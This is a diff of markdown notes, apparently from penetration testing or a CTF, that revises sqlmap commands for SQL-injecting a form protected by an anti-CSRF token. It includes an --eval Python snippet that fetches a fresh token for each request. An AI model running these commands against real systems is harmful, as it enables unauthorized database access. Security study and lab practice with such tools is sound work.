@@ -19,9 +19,9 @@ As an example case with `<input ... type='email'>`, you can inspect the tag and 
 
 ### How do you use sqlmap when the site has an anti-CSRF token mechanism?
 ```
-sqlmap -u http://personnel.wey-tech.com/application-check.php --data="applicantmail=blah&token=M" --csrf-url="http://personnel.wey-tech.com/validator.php?null" --csrf-token=token -v 6
+sqlmap -u "http://personnel.wey-tech.com/application-check.php?applicantmail=blah&token=M" --csrf-url="http://personnel.wey-tech.com/validator.php" --csrf-token=token -v 6
 ```
 If that doesn't work, you may need to use `eval` to write a custom python script.
 ```
-sqlmap -u http://personnel.wey-tech.com/application-check.php --data="applicantmail=blah&token=M" --eval "import time;time.sleep(1);import urllib;page = urllib.urlopen('http://personnel.wey-tech.com/validator.php');token = urllib.quote(str(page.read()).decode('utf-8'));print(token)" -p applicantmail --user-agent='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' -v 4
+sqlmap -u "http://personnel.wey-tech.com/application-check.php?applicantmail=blah&token=M" --eval "import urllib;page = urllib.urlopen('http://personnel.wey-tech.com/validator.php');token = urllib.quote(str(page.read()).decode('utf-8'));print(token)" -p applicantmail -v 1
 ```
